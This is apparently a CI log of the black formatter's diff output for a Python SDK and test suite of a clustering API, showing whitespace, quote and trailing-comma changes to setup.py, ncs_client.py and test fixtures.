     description="Official Python client library for the NeuroCluster Streamer API",
     long_description=get_long_description(),
     long_description_content_type="text/markdown",
-    
     # Author information
     author="NCS API Development Team",
     author_email="sdk@yourdomain.com",
     maintainer="NCS API Development Team",
     maintainer_email="sdk@yourdomain.com",
-    
     # Project URLs
     url="https://github.com/your-org/ncs-api",
     project_urls={
         "Documentation": "https://docs.ncs-api.com/sdk/python",
         "Source Code": "https://github.com/your-org/ncs-api/tree/main/sdk/python",
         "Issue Tracker": "https://github.com/your-org/ncs-api/issues",
         "API Documentation": "https://api.yourdomain.com/docs",
-        "Changelog": "https://github.com/your-org/ncs-api/blob/main/CHANGELOG.md"
-    },
-    
+        "Changelog": "https://github.com/your-org/ncs-api/blob/main/CHANGELOG.md",
+    },
     # Package configuration
-    packages=find_packages(exclude=['tests*', 'examples*']),
-    package_dir={'': '.'},
+    packages=find_packages(exclude=["tests*", "examples*"]),
+    package_dir={"": "."},
     include_package_data=True,
-    
     # Dependencies
-    install_requires=get_requirements('requirements.txt'),
+    install_requires=get_requirements("requirements.txt"),
     extras_require={
-        'dev': get_requirements('requirements-dev.txt'),
-        'test': [
-            'pytest>=7.0.0',
-            'pytest-asyncio>=0.21.0',
-            'pytest-cov>=4.0.0',
-            'pytest-mock>=3.10.0',
-            'httpx[test]>=0.25.0',
-            'responses>=0.23.0',
-            'factory-boy>=3.2.0',
-        ],
-        'docs': [
-            'sphinx>=5.0.0',
-            'sphinx-rtd-theme>=1.2.0',
-            'sphinx-autodoc-typehints>=1.19.0',
-            'myst-parser>=0.18.0',
-        ],
-        'performance': [
-            'numpy>=1.24.0',
-            'pandas>=1.5.0',
-            'pyarrow>=10.0.0',
-        ],
-        'async': [
-            'aiofiles>=22.0.0',
-            'asyncio-throttle>=1.0.0',
-        ]
-    },
-    
+        "dev": get_requirements("requirements-dev.txt"),
+        "test": [
+            "pytest>=7.0.0",
+            "pytest-asyncio>=0.21.0",
+            "pytest-cov>=4.0.0",
+            "pytest-mock>=3.10.0",
+            "httpx[test]>=0.25.0",
+            "responses>=0.23.0",
+            "factory-boy>=3.2.0",
+        ],
+        "docs": [
+            "sphinx>=5.0.0",
+            "sphinx-rtd-theme>=1.2.0",
+            "sphinx-autodoc-typehints>=1.19.0",
+            "myst-parser>=0.18.0",
+        ],
+        "performance": [
+            "numpy>=1.24.0",
+            "pandas>=1.5.0",
+            "pyarrow>=10.0.0",
+        ],
+        "async": [
+            "aiofiles>=22.0.0",
+            "asyncio-throttle>=1.0.0",
+        ],
+    },
     # Python version requirements
     python_requires=">=3.8",
-    
     # Package classification
     classifiers=[
         # Development Status
         "Development Status :: 5 - Production/Stable",
-        
         # Intended Audience
         "Intended Audience :: Developers",
         "Intended Audience :: Science/Research",
         "Intended Audience :: Information Technology",
-        
         # Topic
         "Topic :: Scientific/Engineering :: Artificial Intelligence",
         "Topic :: Scientific/Engineering :: Information Analysis",
         "Topic :: Software Development :: Libraries :: Python Modules",
         "Topic :: Internet :: WWW/HTTP :: Dynamic Content",
-        
         # License
         "License :: OSI Approved :: MIT License",
-        
         # Programming Language
         "Programming Language :: Python :: 3",
         "Programming Language :: Python :: 3.8",
         "Programming Language :: Python :: 3.9",
         "Programming Language :: Python :: 3.10",
         "Programming Language :: Python :: 3.11",
         "Programming Language :: Python :: 3.12",
-        
         # Operating System
         "Operating System :: OS Independent",
-        
         # Framework
         "Framework :: AsyncIO",
-        
         # Typing
         "Typing :: Typed",
     ],
-    
     # Keywords for discovery
     keywords=[
         "api-client",
         "clustering",
-        "machine-learning", 
+        "machine-learning",
         "data-science",
         "stream-processing",
         "neurocluster",
         "real-time",
         "analytics",
         "artificial-intelligence",
-        "http-client"
+        "http-client",
     ],
-    
     # Entry points for CLI tools (if needed)
     entry_points={
-        'console_scripts': [
-            'ncs-cli=ncs_client.cli:main',
-        ],
-    },
-    
+        "console_scripts": [
+            "ncs-cli=ncs_client.cli:main",
+        ],
+    },
     # Package data
     package_data={
-        'ncs_client': [
-            'py.typed',  # PEP 561 typed package marker
-            'config/*.json',
-            'templates/*.json',
-        ],
-    },
-    
+        "ncs_client": [
+            "py.typed",  # PEP 561 typed package marker
+            "config/*.json",
+            "templates/*.json",
+        ],
+    },
     # Data files
     data_files=[
-        ('share/ncs-python-sdk/examples', [
-            'examples/basic_usage.py',
-            'examples/streaming_example.py',
-            'examples/batch_processing.py',
-        ]),
+        (
+            "share/ncs-python-sdk/examples",
+            [
+                "examples/basic_usage.py",
+                "examples/streaming_example.py",
+                "examples/batch_processing.py",
+            ],
+        ),
     ],
-    
     # Options
     zip_safe=False,  # Required for mypy to find py.typed
-    
     # Additional metadata for modern Python packaging
     license="MIT",
     platforms=["any"],
-    
     # Test configuration
     test_suite="tests",
-    tests_require=get_requirements('requirements-test.txt'),
-    
+    tests_require=get_requirements("requirements-test.txt"),
     # Build options
     options={
-        'build_scripts': {
-            'executable': '/usr/bin/env python3',
+        "build_scripts": {
+            "executable": "/usr/bin/env python3",
         },
-        'egg_info': {
-            'tag_build': '',
-            'tag_date': False,
+        "egg_info": {
+            "tag_build": "",
+            "tag_date": False,
         },
     },
 )
 
 # Post-install message
-print("""
+print(
+    """
 🎉 NeuroCluster Streamer Python SDK installed successfully!
 
 Quick start:
     from ncs_client import NCSClient
     
@@ -215,6 +204,7 @@
 📚 Documentation: https://docs.ncs-api.com/sdk/python
 🐛 Issues: https://github.com/your-org/ncs-api/issues
 💬 Support: sdk@yourdomain.com
 
 Happy clustering! 🚀
-""")
\ No newline at end of file
+"""
+)
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/tests/__init__.py
--- /home/runner/work/NCS-API-Project/NCS-API-Project/tests/__init__.py	2025-06-10 20:31:25.484857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/tests/__init__.py	2025-06-10 20:32:35.852000+00:00
@@ -33,44 +33,44 @@
 SAMPLE_DATA_POINTS = [
     {"id": "test_1", "features": [1.0, 2.0, 3.0]},
     {"id": "test_2", "features": [1.1, 2.1, 3.1]},
     {"id": "test_3", "features": [5.0, 6.0, 7.0]},
     {"id": "test_4", "features": [5.1, 6.1, 7.1]},
-    {"id": "test_5", "features": [10.0, 11.0, 12.0]}
+    {"id": "test_5", "features": [10.0, 11.0, 12.0]},
 ]
 
 SAMPLE_CLUSTERING_CONFIG = {
     "similarity_threshold": 0.85,
     "min_cluster_size": 2,
     "max_clusters": 100,
     "outlier_threshold": 0.75,
-    "adaptive_threshold": True
+    "adaptive_threshold": True,
 }
 
 # Test user credentials
 TEST_USERS = {
     "admin": {
         "user_id": "test_admin",
         "email": "admin@test.com",
         "password": "admin_password_123",
         "role": "admin",
-        "scopes": ["read", "write", "admin"]
+        "scopes": ["read", "write", "admin"],
     },
     "user": {
         "user_id": "test_user",
-        "email": "user@test.com", 
+        "email": "user@test.com",
         "password": "user_password_123",
         "role": "user",
-        "scopes": ["read", "write"]
+        "scopes": ["read", "write"],
     },
     "readonly": {
         "user_id": "test_readonly",
         "email": "readonly@test.com",
-        "password": "readonly_password_123", 
+        "password": "readonly_password_123",
         "role": "readonly",
-        "scopes": ["read"]
-    }
+        "scopes": ["read"],
+    },
 }
 
 # API endpoint constants
 API_ENDPOINTS = {
     "health": "/health",
@@ -79,42 +79,42 @@
     "process_point": "/process-point",
     "process_batch": "/process-batch",
     "get_clusters": "/clusters",
     "get_session": "/session/{session_id}",
     "get_statistics": "/statistics",
-    "get_metrics": "/metrics"
+    "get_metrics": "/metrics",
 }
 
 # Test timeouts and limits
 TEST_TIMEOUTS = {
     "api_request": 30,  # seconds
     "algorithm_processing": 10,  # seconds
     "database_operation": 5,  # seconds
-    "auth_operation": 3  # seconds
+    "auth_operation": 3,  # seconds
 }
 
 # Performance test parameters
 PERFORMANCE_TEST_CONFIG = {
     "small_batch": 100,
     "medium_batch": 1000,
     "large_batch": 10000,
     "stress_batch": 50000,
     "concurrent_users": [1, 5, 10, 20],
     "target_response_time_ms": 200,
-    "target_throughput_per_sec": 1000
+    "target_throughput_per_sec": 1000,
 }
 
 # Test markers for pytest
 TEST_MARKERS = {
     "unit": "Unit tests for individual components",
-    "integration": "Integration tests for component interactions", 
+    "integration": "Integration tests for component interactions",
     "e2e": "End-to-end tests for complete workflows",
     "performance": "Performance and load tests",
     "security": "Security and authentication tests",
     "slow": "Tests that take longer than 5 seconds",
     "database": "Tests that require database connectivity",
-    "external": "Tests that require external services"
+    "external": "Tests that require external services",
 }
 
 __version__ = "1.0.0"
 __author__ = "NCS Development Team"
-__description__ = "Comprehensive test suite for NeuroCluster Streamer API"
\ No newline at end of file
+__description__ = "Comprehensive test suite for NeuroCluster Streamer API"
--- /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/ncs_client.py	2025-06-10 20:31:25.484857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/ncs_client.py	2025-06-10 20:32:36.022011+00:00
@@ -36,542 +36,576 @@
 
 # =============================================================================
 # Data Models
 # =============================================================================
 
+
 @dataclass
 class Cluster:
     """Represents a data cluster from the NCS algorithm."""
+
     id: int
     center: Point
     points: Points
     size: int
     quality: float
     created_at: Optional[datetime] = None
     last_updated: Optional[datetime] = None
-    
+
     def __post_init__(self):
         if self.created_at and isinstance(self.created_at, str):
-            self.created_at = datetime.fromisoformat(self.created_at.replace('Z', '+00:00'))
+            self.created_at = datetime.fromisoformat(
+                self.created_at.replace("Z", "+00:00")
+            )
         if self.last_updated and isinstance(self.last_updated, str):
-            self.last_updated = datetime.fromisoformat(self.last_updated.replace('Z', '+00:00'))
+            self.last_updated = datetime.fromisoformat(
+                self.last_updated.replace("Z", "+00:00")
+            )
+
 
 @dataclass
 class ProcessingResult:
     """Result from processing data points."""
+
     clusters: List[Cluster]
     outliers: Points
     processing_time_ms: float
     algorithm_quality: float
     request_id: str
     total_points: int = 0
-    
+
     def __post_init__(self):
         if not self.total_points:
-            self.total_points = sum(len(cluster.points) for cluster in self.clusters) + len(self.outliers)
+            self.total_points = sum(
+                len(cluster.points) for cluster in self.clusters
+            ) + len(self.outliers)
+
 
 @dataclass
 class AlgorithmStatus:
     """Current status of the NCS algorithm."""
+
     is_ready: bool
     active_clusters: int
     total_points_processed: int
     clustering_quality: float
     memory_usage_mb: float
     last_processing_time_ms: float
     error_count: int = 0
     uptime_seconds: float = 0
 
+
 @dataclass
 class HealthStatus:
     """API health status information."""
+
     status: str
     timestamp: datetime
     version: str
     algorithm_ready: bool
     uptime_seconds: float
     components: Dict[str, str] = field(default_factory=dict)
 
+
 # =============================================================================
 # Exception Classes
 # =============================================================================
+
 
 class NCSError(Exception):
     """Base exception for NCS client errors."""
-    
-    def __init__(self, message: str, status_code: Optional[int] = None, 
-                 error_code: Optional[str] = None, request_id: Optional[str] = None):
+
+    def __init__(
+        self,
+        message: str,
+        status_code: Optional[int] = None,
+        error_code: Optional[str] = None,
+        request_id: Optional[str] = None,
+    ):
         super().__init__(message)
         self.message = message
         self.status_code = status_code
         self.error_code = error_code
         self.request_id = request_id
 
+
 class AuthenticationError(NCSError):
     """Authentication failed."""
+
     pass
+
 
 class RateLimitError(NCSError):
     """Rate limit exceeded."""
-    
+
     def __init__(self, message: str, retry_after: Optional[int] = None, **kwargs):
         super().__init__(message, **kwargs)
         self.retry_after = retry_after
 
+
 class ValidationError(NCSError):
     """Request validation failed."""
+
     pass
+
 
 class ProcessingError(NCSError):
     """Algorithm processing error."""
+
     pass
+
 
 class ConnectionError(NCSError):
     """Network connection error."""
+
     pass
 
+
 # =============================================================================
 # Main Client Classes
 # =============================================================================
+
 
 class NCSClient:
     """Synchronous client for the NeuroCluster Streamer API."""
-    
+
     def __init__(
         self,
         base_url: str,
         api_key: Optional[str] = None,
         jwt_token: Optional[str] = None,
         timeout: float = 30.0,
         max_retries: int = 3,
         retry_delay: float = 1.0,
         verify_ssl: bool = True,
         headers: Optional[Dict[str, str]] = None,
-        log_level: str = "INFO"
+        log_level: str = "INFO",
     ):
         """
         Initialize the NCS client.
-        
+
         Args:
             base_url: Base URL of the NCS API
             api_key: API key for authentication
-            jwt_token: JWT token for authentication  
+            jwt_token: JWT token for authentication
             timeout: Request timeout in seconds
             max_retries: Maximum number of retry attempts
             retry_delay: Delay between retries in seconds
             verify_ssl: Whether to verify SSL certificates
             headers: Additional headers to send with requests
             log_level: Logging level (DEBUG, INFO, WARNING, ERROR)
         """
-        self.base_url = base_url.rstrip('/')
+        self.base_url = base_url.rstrip("/")
         self.api_key = api_key
         self.jwt_token = jwt_token
         self.timeout = timeout
         self.max_retries = max_retries
         self.retry_delay = retry_delay
         self.verify_ssl = verify_ssl
         self.logger = self._setup_logging(log_level)
-        
+
         # Setup session with retry strategy
         self.session = self._create_session()
         self._setup_authentication()
-        
+
         # Add custom headers
         if headers:
             self.session.headers.update(headers)
-    
+
     def _setup_logging(self, log_level: str) -> logging.Logger:
         """Setup logging for the client."""
         logger = logging.getLogger(f"{__name__}.{self.__class__.__name__}")
         logger.setLevel(getattr(logging, log_level.upper()))
-        
+
         if not logger.handlers:
             handler = logging.StreamHandler()
             formatter = logging.Formatter(
-                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+                "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
             )
             handler.setFormatter(formatter)
             logger.addHandler(handler)
-        
+
         return logger
-    
+
     def _create_session(self) -> requests.Session:
         """Create HTTP session with retry strategy."""
         session = requests.Session()
-        
+
         # Setup retry strategy
         retry_strategy = Retry(
             total=self.max_retries,
             backoff_factor=self.retry_delay,
             status_forcelist=[429, 500, 502, 503, 504],
-            allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
+            allowed_methods=[
+                "HEAD",
+                "GET",
+                "POST",
+                "PUT",
+                "DELETE",
+                "OPTIONS",
+                "TRACE",
+            ],
         )
-        
+
         adapter = HTTPAdapter(max_retries=retry_strategy)
         session.mount("http://", adapter)
         session.mount("https://", adapter)
-        
+
         # Set default headers
-        session.headers.update({
-            'User-Agent': f'ncs-python-sdk/1.0.0',
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
-        })
-        
+        session.headers.update(
+            {
+                "User-Agent": f"ncs-python-sdk/1.0.0",
+                "Accept": "application/json",
+                "Content-Type": "application/json",
+            }
+        )
+
         return session
-    
+
     def _setup_authentication(self):
         """Setup authentication headers."""
         if self.api_key:
-            self.session.headers['X-API-Key'] = self.api_key
+            self.session.headers["X-API-Key"] = self.api_key
         elif self.jwt_token:
-            self.session.headers['Authorization'] = f'***'
-    
+            self.session.headers["Authorization"] = f"***"
+
     def authenticate(self, username: str, password: str) -> str:
         """
         Authenticate with username/password and get JWT token.
-        
+
         Args:
             username: Username for authentication
             password: Password for authentication
-            
+
         Returns:
             JWT token
-            
+
         Raises:
             AuthenticationError: If authentication fails
         """
         self.logger.info("Authenticating with username/password")
-        
-        auth_data = {
-            'username': username,
-            'password': password
-        }
-        
+
+        auth_data = {"username": username, "password": password}
+
         try:
             response = self.session.post(
-                f'{self.base_url}/auth/login',
+                f"{self.base_url}/auth/login",
                 data=auth_data,
-                headers={'Content-Type': 'application/x-www-form-urlencoded'},
+                headers={"Content-Type": "application/x-www-form-urlencoded"},
                 timeout=self.timeout,
-                verify=self.verify_ssl
+                verify=self.verify_ssl,
             )
-            
+
             if response.status_code == 200:
                 token_data = response.json()
-                self.jwt_token = token_data['access_token']
-                self.session.headers['Authorization'] = f'***'
+                self.jwt_token = token_data["access_token"]
+                self.session.headers["Authorization"] = f"***"
                 self.logger.info("Authentication successful")
                 return self.jwt_token
             else:
                 raise AuthenticationError(
                     "Authentication failed",
                     status_code=response.status_code,
-                    request_id=response.headers.get('X-Request-ID')
+                    request_id=response.headers.get("X-Request-ID"),
                 )
-                
+
         except requests.RequestException as e:
             raise ConnectionError(f"Authentication request failed: {str(e)}")
-    
+
     @sleep_and_retry
     @limits(calls=100, period=60)  # Rate limiting: 100 calls per minute
     def _make_request(
-        self, 
-        method: str, 
-        endpoint: str, 
+        self,
+        method: str,
+        endpoint: str,
         data: Optional[Dict] = None,
-        params: Optional[Dict] = None
+        params: Optional[Dict] = None,
     ) -> requests.Response:
         """
         Make HTTP request with error handling and rate limiting.
-        
+
         Args:
             method: HTTP method (GET, POST, etc.)
             endpoint: API endpoint
             data: Request body data
             params: URL parameters
-            
+
         Returns:
             Response object
-            
+
         Raises:
             Various NCSError subclasses based on response
         """
         url = f"{self.base_url}{endpoint}"
-        
+
         try:
             self.logger.debug(f"Making {method} request to {url}")
-            
+
             response = self.session.request(
                 method=method,
                 url=url,
                 json=data if data else None,
                 params=params,
                 timeout=self.timeout,
-                verify=self.verify_ssl
+                verify=self.verify_ssl,
             )
-            
+
             # Handle different response codes
             if response.status_code == 200:
                 return response
             elif response.status_code == 401:
                 raise AuthenticationError(
                     "Authentication required or token expired",
                     status_code=response.status_code,
-                    request_id=response.headers.get('X-Request-ID')
+                    request_id=response.headers.get("X-Request-ID"),
                 )
             elif response.status_code == 403:
                 raise AuthenticationError(
                     "Insufficient permissions",
                     status_code=response.status_code,
-                    request_id=response.headers.get('X-Request-ID')
+                    request_id=response.headers.get("X-Request-ID"),
                 )
             elif response.status_code == 429:
-                retry_after = int(response.headers.get('Retry-After', 60))
+                retry_after = int(response.headers.get("Retry-After", 60))
                 raise RateLimitError(
                     "Rate limit exceeded",
                     status_code=response.status_code,
                     retry_after=retry_after,
-                    request_id=response.headers.get('X-Request-ID')
+                    request_id=response.headers.get("X-Request-ID"),
                 )
             elif response.status_code == 422:
-                error_detail = response.json().get('detail', 'Validation error')
+                error_detail = response.json().get("detail", "Validation error")
                 raise ValidationError(
                     error_detail,
                     status_code=response.status_code,
-                    request_id=response.headers.get('X-Request-ID')
+                    request_id=response.headers.get("X-Request-ID"),
                 )
             elif response.status_code >= 500:
                 raise ProcessingError(
                     "Server error occurred",
                     status_code=response.status_code,
-                    request_id=response.headers.get('X-Request-ID')
+                    request_id=response.headers.get("X-Request-ID"),
                 )
             else:
                 raise NCSError(
                     f"Unexpected response: {response.status_code}",
                     status_code=response.status_code,
-                    request_id=response.headers.get('X-Request-ID')
+                    request_id=response.headers.get("X-Request-ID"),
                 )
-                
+
         except requests.RequestException as e:
             raise ConnectionError(f"Request failed: {str(e)}")
-    
+
     def health_check(self) -> HealthStatus:
         """
         Check API health status.
-        
+
         Returns:
             HealthStatus object
         """
         self.logger.debug("Checking API health")
-        
-        response = self._make_request('GET', '/health')
+
+        response = self._make_request("GET", "/health")
         data = response.json()
-        
+
         return HealthStatus(
-            status=data['status'],
-            timestamp=datetime.fromisoformat(data['timestamp'].replace('Z', '+00:00')),
-            version=data['version'],
-            algorithm_ready=data['algorithm_ready'],
-            uptime_seconds=data['uptime_seconds'],
-            components=data.get('components', {})
+            status=data["status"],
+            timestamp=datetime.fromisoformat(data["timestamp"].replace("Z", "+00:00")),
+            version=data["version"],
+            algorithm_ready=data["algorithm_ready"],
+            uptime_seconds=data["uptime_seconds"],
+            components=data.get("components", {}),
         )
-    
+
     def process_points(
-        self, 
-        points: Points,
-        options: Optional[Dict[str, Any]] = None
+        self, points: Points, options: Optional[Dict[str, Any]] = None
     ) -> ProcessingResult:
         """
         Process data points through the clustering algorithm.
-        
+
         Args:
             points: List of data points to process
             options: Additional processing options
-            
+
         Returns:
             ProcessingResult with clusters and outliers
         """
         self.logger.info(f"Processing {len(points)} data points")
-        
-        request_data = {
-            'points': points
-        }
-        
+
+        request_data = {"points": points}
+
         if options:
             request_data.update(options)
-        
-        response = self._make_request('POST', '/api/v1/process_points', data=request_data)
+
+        response = self._make_request(
+            "POST", "/api/v1/process_points", data=request_data
+        )
         data = response.json()
-        
+
         # Parse clusters
         clusters = [
             Cluster(
-                id=cluster['id'],
-                center=cluster['center'],
-                points=cluster['points'],
-                size=cluster['size'],
-                quality=cluster['quality'],
-                created_at=cluster.get('created_at'),
-                last_updated=cluster.get('last_updated')
+                id=cluster["id"],
+                center=cluster["center"],
+                points=cluster["points"],
+                size=cluster["size"],
+                quality=cluster["quality"],
+                created_at=cluster.get("created_at"),
+                last_updated=cluster.get("last_updated"),
             )
-            for cluster in data['clusters']
+            for cluster in data["clusters"]
         ]
-        
+
         result = ProcessingResult(
             clusters=clusters,
-            outliers=data['outliers'],
-            processing_time_ms=data['processing_time_ms'],
-            algorithm_quality=data['algorithm_quality'],
-            request_id=data['request_id']
+            outliers=data["outliers"],
+            processing_time_ms=data["processing_time_ms"],
+            algorithm_quality=data["algorithm_quality"],
+            request_id=data["request_id"],
         )
-        
-        self.logger.info(f"Processing complete: {len(clusters)} clusters, {len(data['outliers'])} outliers")
+
+        self.logger.info(
+            f"Processing complete: {len(clusters)} clusters, {len(data['outliers'])} outliers"
+        )
         return result
-    
-    def get_clusters_summary(self, filters: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+
+    def get_clusters_summary(
+        self, filters: Optional[Dict[str, Any]] = None
+    ) -> Dict[str, Any]:
         """
         Get summary of current clusters.
-        
+
         Args:
             filters: Optional filters for cluster selection
-            
+
         Returns:
             Cluster summary data
         """
         self.logger.debug("Getting clusters summary")
-        
+
         params = filters if filters else {}
-        response = self._make_request('GET', '/api/v1/clusters_summary', params=params)
-        
+        response = self._make_request("GET", "/api/v1/clusters_summary", params=params)
+
         return response.json()
-    
+
     def get_algorithm_status(self) -> AlgorithmStatus:
         """
         Get current algorithm status.
-        
+
         Returns:
             AlgorithmStatus object
         """
         self.logger.debug("Getting algorithm status")
-        
-        response = self._make_request('GET', '/api/v1/algorithm_status')
+
+        response = self._make_request("GET", "/api/v1/algorithm_status")
         data = response.json()
-        
+
         return AlgorithmStatus(
-            is_ready=data['is_ready'],
-            active_clusters=data['active_clusters'],
-            total_points_processed=data['total_points_processed'],
-            clustering_quality=data['clustering_quality'],
-            memory_usage_mb=data['memory_usage_mb'],
-            last_processing_time_ms=data['last_processing_time_ms'],
-            error_count=data.get('error_count', 0),
-            uptime_seconds=data.get('uptime_seconds', 0)
+            is_ready=data["is_ready"],
+            active_clusters=data["active_clusters"],
+            total_points_processed=data["total_points_processed"],
+            clustering_quality=data["clustering_quality"],
+            memory_usage_mb=data["memory_usage_mb"],
+            last_processing_time_ms=data["last_processing_time_ms"],
+            error_count=data.get("error_count", 0),
+            uptime_seconds=data.get("uptime_seconds", 0),
         )
-    
+
     def process_points_batch(
-        self,
-        points_batch: Points,
-        batch_options: Optional[Dict[str, Any]] = None
+        self, points_batch: Points, batch_options: Optional[Dict[str, Any]] = None
     ) -> ProcessingResult:
         """
         Process a large batch of points with optimizations.
-        
+
         Args:
             points_batch: Large batch of points to process
             batch_options: Batch-specific options (timeout, chunk_size, etc.)
-            
+
         Returns:
             ProcessingResult for the entire batch
         """
         self.logger.info(f"Processing batch of {len(points_batch)} points")
-        
+
         # Default batch options
         options = {
-            'batch_mode': True,
-            'timeout': batch_options.get('timeout', 60) if batch_options else 60
+            "batch_mode": True,
+            "timeout": batch_options.get("timeout", 60) if batch_options else 60,
         }
-        
+
         if batch_options:
             options.update(batch_options)
-        
+
         return self.process_points(points_batch, options)
-    
+
     def close(self):
         """Close the client session."""
-        if hasattr(self, 'session'):
+        if hasattr(self, "session"):
             self.session.close()
             self.logger.debug("Client session closed")
-    
+
     def __enter__(self):
         """Context manager entry."""
         return self
-    
+
     def __exit__(self, exc_type, exc_val, exc_tb):
         """Context manager exit."""
         self.close()
-    
+
     @classmethod
-    def from_config(cls, config: Dict[str, Any]) -> 'NCSClient':
+    def from_config(cls, config: Dict[str, Any]) -> "NCSClient":
         """
         Create client from configuration dictionary.
-        
+
         Args:
             config: Configuration dictionary
-            
+
         Returns:
             Configured NCSClient instance
         """
         return cls(**config)
 
+
 # =============================================================================
 # Client Factory and Utilities
 # =============================================================================
 
-def create_client(
-    base_url: str,
-    api_key: Optional[str] = None,
-    **kwargs
-) -> NCSClient:
+
+def create_client(base_url: str, api_key: Optional[str] = None, **kwargs) -> NCSClient:
     """
     Factory function to create an NCS client.
-    
+
     Args:
         base_url: Base URL of the NCS API
         api_key: API key for authentication
         **kwargs: Additional client options
-        
+
     Returns:
         Configured NCSClient instance
     """
     return NCSClient(base_url=base_url, api_key=api_key, **kwargs)
 
+
 # =============================================================================
 # Module Exports
 # =============================================================================
 
 __all__ = [
     # Main classes
-    'NCSClient',
-    
+    "NCSClient",
     # Data models
-    'Cluster',
-    'ProcessingResult', 
-    'AlgorithmStatus',
-    'HealthStatus',
-    
+    "Cluster",
+    "ProcessingResult",
+    "AlgorithmStatus",
+    "HealthStatus",
     # Exceptions
-    'NCSError',
-    'AuthenticationError',
-    'RateLimitError',
-    'ValidationError',
-    'ProcessingError',
-    'ConnectionError',
-    
+    "NCSError",
+    "AuthenticationError",
+    "RateLimitError",
+    "ValidationError",
+    "ProcessingError",
+    "ConnectionError",
     # Utilities
-    'create_client',
-    
+    "create_client",
     # Type definitions
-    'Point',
-    'Points'
-]
\ No newline at end of file
+    "Point",
+    "Points",
+]
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/ncs_client.py
--- /home/runner/work/NCS-API-Project/NCS-API-Project/tests/conftest.py	2025-06-10 20:31:25.484857+00:00
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/tests/conftest.py
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/tests/conftest.py	2025-06-10 20:32:36.125172+00:00
@@ -33,453 +33,492 @@
 from NCS_V8 import NCSClusteringAlgorithm
 from app.dependencies import get_algorithm_instance
 
 # Import test constants
 from . import (
-    TEST_DATABASE_URL, TEST_REDIS_URL, SAMPLE_DATA_POINTS, 
-    SAMPLE_CLUSTERING_CONFIG, TEST_USERS, TEST_TIMEOUTS
+    TEST_DATABASE_URL,
+    TEST_REDIS_URL,
+    SAMPLE_DATA_POINTS,
+    SAMPLE_CLUSTERING_CONFIG,
+    TEST_USERS,
+    TEST_TIMEOUTS,
 )
+
 
 # Configure pytest markers
 def pytest_configure(config):
     """Configure pytest with custom markers."""
     config.addinivalue_line("markers", "unit: Unit tests for individual components")
-    config.addinivalue_line("markers", "integration: Integration tests for component interactions")
+    config.addinivalue_line(
+        "markers", "integration: Integration tests for component interactions"
+    )
     config.addinivalue_line("markers", "e2e: End-to-end tests for complete workflows")
     config.addinivalue_line("markers", "performance: Performance and load tests")
     config.addinivalue_line("markers", "security: Security and authentication tests")
     config.addinivalue_line("markers", "slow: Tests that take longer than 5 seconds")
-    config.addinivalue_line("markers", "database: Tests that require database connectivity")
+    config.addinivalue_line(
+        "markers", "database: Tests that require database connectivity"
+    )
     config.addinivalue_line("markers", "external: Tests that require external services")
+
 
 # Test database setup
 @pytest.fixture(scope="session")
 def test_database_url():
     """Provide test database URL."""
     # Use in-memory SQLite for tests
     return "sqlite:///:memory:"
+
 
 @pytest.fixture(scope="session")
 def test_engine(test_database_url):
     """Create test database engine."""
     engine = create_engine(
         test_database_url,
         connect_args={"check_same_thread": False},
         poolclass=StaticPool,
-        echo=False  # Set to True for SQL debugging
+        echo=False,  # Set to True for SQL debugging
     )
-    
+
     # Create all tables
     Base.metadata.create_all(bind=engine)
-    
+
     yield engine
-    
+
     # Cleanup
     Base.metadata.drop_all(bind=engine)
     engine.dispose()
+
 
 @pytest.fixture(scope="function")
 def test_db_session(test_engine) -> Generator[Session, None, None]:
     """Provide isolated database session for each test."""
     connection = test_engine.connect()
     transaction = connection.begin()
-    
+
     # Create session bound to the connection
     TestSessionLocal = sessionmaker(bind=connection)
     session = TestSessionLocal()
-    
+
     yield session
-    
+
     # Cleanup
     session.close()
     transaction.rollback()
     connection.close()
 
+
 @pytest.fixture(scope="function")
 def override_get_db(test_db_session):
     """Override database dependency for tests."""
+
     def _override_get_db():
         try:
             yield test_db_session
         finally:
             pass
-    
+
     app.dependency_overrides[get_db_session] = _override_get_db
     yield
     app.dependency_overrides.clear()
+
 
 # Algorithm fixtures
 @pytest.fixture(scope="function")
 def test_algorithm():
     """Provide test NCS algorithm instance."""
     config = SAMPLE_CLUSTERING_CONFIG.copy()
     algorithm = NCSClusteringAlgorithm(**config)
     return algorithm
 
+
 @pytest.fixture(scope="function")
 def mock_algorithm():
     """Provide mock algorithm for testing API without algorithm logic."""
     mock = MagicMock(spec=NCSClusteringAlgorithm)
-    
+
     # Configure mock responses
     mock.process_point.return_value = {
         "cluster_id": "cluster_1",
         "is_outlier": False,
         "confidence": 0.95,
-        "processing_time_ms": 1.5
+        "processing_time_ms": 1.5,
     }
-    
+
     mock.get_statistics.return_value = {
         "total_points": 100,
         "active_clusters": 5,
         "outliers_detected": 3,
-        "avg_processing_time_ms": 2.1
+        "avg_processing_time_ms": 2.1,
     }
-    
+
     mock.get_clusters.return_value = [
         {
             "id": "cluster_1",
             "centroid": [1.0, 2.0, 3.0],
             "size": 25,
-            "health": "healthy"
+            "health": "healthy",
         }
     ]
-    
+
     return mock
+
 
 @pytest.fixture(scope="function")
 def override_algorithm(mock_algorithm):
     """Override algorithm dependency for tests."""
+
     def _override_algorithm():
         return mock_algorithm
-    
+
     app.dependency_overrides[get_algorithm_instance] = _override_algorithm
     yield mock_algorithm
     app.dependency_overrides.clear()
+
 
 # FastAPI test client
 @pytest.fixture(scope="function")
 def test_client(override_get_db) -> TestClient:
     """Provide FastAPI test client."""
     with TestClient(app) as client:
         yield client
 
+
 @pytest.fixture(scope="function")
 def async_test_client(override_get_db):
     """Provide async test client."""
     from httpx import AsyncClient
-    
+
     async def _async_client():
         async with AsyncClient(app=app, base_url="http://test") as client:
             yield client
-    
+
     return _async_client
+
 
 # Authentication fixtures
 @pytest.fixture(scope="function")
 def test_tokens():
     """Generate test JWT tokens for different user types."""
     tokens = {}
-    
+
     for user_type, user_data in TEST_USERS.items():
         token_data = {
             "sub": user_data["user_id"],
